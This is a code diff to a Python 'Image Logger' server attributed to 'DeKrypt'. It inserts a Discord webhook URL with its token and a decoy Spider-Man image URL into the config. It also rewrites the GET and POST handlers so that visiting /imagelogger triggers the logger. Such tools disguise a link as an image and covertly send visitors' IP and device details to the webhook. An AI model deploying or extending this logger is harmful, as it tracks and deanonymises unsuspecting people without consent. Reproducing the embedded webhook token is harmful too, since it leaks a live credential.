@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "",  # PASTE YOUR WEBHOOK URL HERE
-    "image": "",
+    "webhook": "https://discord.com/api/webhooks/1542691542807085098/tx_7D0GCqfYhVzqlgOs-67dCkqb46bOE3NINz7LtlLxKH0nZIIJrTT0xT9npO4hnKlWh",
+    "image": "https://cdn.pfps.gg/pfps/3025-cool-spiderman.png",
     "imageArgument": True,
 
     # CUSTOMIZATION #
@@ -255,8 +255,17 @@ if (!currenturl.includes("g=")) {
 
         return
 
-    do_GET = handleRequest
-    do_POST = handleRequest
+    def do_GET(self):
+        if self.path == "/":
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+            self.wfile.write(b'<h1>Image Logger Server</h1><p>Visit <a href="/imagelogger">/imagelogger</a> to trigger the logger.</p>')
+            return
+        self.handleRequest()
+
+    def do_POST(self):
+        self.handleRequest()
 
 
 def run_server():
